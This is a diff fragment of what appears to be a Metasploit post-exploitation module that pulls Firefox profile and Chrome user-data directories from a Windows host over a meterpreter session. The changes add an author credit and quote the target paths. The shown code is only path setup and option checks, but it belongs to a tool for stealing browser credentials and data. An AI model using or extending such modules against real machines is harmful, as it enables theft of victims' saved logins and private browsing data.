@@ -33,7 +33,7 @@ def initialize(info = {})
       'License'      => 'UNKNOWN_LICENSE',
       'Platform'     => ['win'],
       'SessionTypes' => ['meterpreter'],
-      'Author'       => ['Milton@barra'],
+      'Author'       => ['r00t-3xp10it, Milton@barra'],
 
     
 	'DefaultOptions' =>
@@ -66,7 +66,7 @@ def firefox_1
 # variable declarations
 profile =''
 outpath = datastore['DOWNLOAD_PATH']
-pth ="%appdata%\\Mozilla\\Firefox\\Profiles"
+pth ="\"%appdata%\"\\Mozilla\\Firefox\\Profiles"
   # check for proper settings enter by user ...
   if datastore['FIREFOX'] == 'nil' || datastore['DOWNLOAD_PATH'] == 'nil'
     print_error("Please set FIREFOX | DOWNLOAD_PATH options...")
@@ -125,8 +125,8 @@ r=''
 # variable declarations
 outpath = datastore['DOWNLOAD_PATH']
 sysnfo = session.sys.config.sysinfo
-pathexe="%programfiles%\\Google\\Chrome\\Application\\chrome.exe"
-datapath="%homepath%\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
+pathexe="\"%programfiles%\"\\Google\\Chrome\\Application\\chrome.exe"
+datapath="%homepath%\\AppData\\Local\\Google\\Chrome\\\"User Data\"\\Default"
 
   # check for proper settings enter by user ...
   if datastore['CHROME'] == 'nil' || datastore['DOWNLOAD_PATH'] == 'nil'
